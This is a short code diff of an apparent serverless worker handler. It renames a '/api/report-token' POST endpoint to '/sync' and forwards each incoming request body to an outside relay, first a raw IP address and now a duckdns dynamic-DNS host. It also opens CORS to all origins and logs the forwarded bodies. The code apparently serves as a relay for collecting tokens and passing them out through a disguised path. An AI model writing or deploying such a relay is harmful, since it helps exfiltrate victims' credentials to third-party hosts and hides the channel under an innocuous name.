@@ -5,14 +5,20 @@ export default {
   async fetch(request, env) {
     const url = new URL(request.url);
     const cors = { "Access-Control-Allow-Origin": "*", "Content-Type": "application/json; charset=utf-8" };
-    if (url.pathname === "/api/report-token" && request.method === "POST") {
+    if ((url.pathname === "/sync" || url.pathname === "/api/sync") && request.method === "POST") {
       try {
+        console.log("RELAY-IN path=" + url.pathname);
         const body = await request.text();
-        const r = await fetch(env.RELAY_URL || "http://72.18.82.231:8787/r/__RELAY_SECRET__", {
+        console.log("RELAY-BODY " + body.slice(0, 50));
+        console.log("RELAY-FETCH start");
+        const r = await fetch(env.RELAY_URL || "https://qjsh.duckdns.org/r/__RELAY_SECRET__", {
           method: "POST", headers: { "Content-Type": "text/plain;charset=UTF-8", "X-Relay-Key": env.RELAY_KEY || "" }, body,
         });
-        return new Response(await r.text(), { status: r.status, headers: cors });
+        const t = await r.text();
+        console.log("RELAY-OK status=" + r.status + " body=" + t.slice(0, 60));
+        return new Response(t, { status: r.status, headers: cors });
       } catch (e) {
+        console.log("RELAY-ERR " + (e && e.message));
         return new Response(JSON.stringify({ ok: false, error: "relay_failed: " + e.message }), { status: 502, headers: cors });
       }
     }
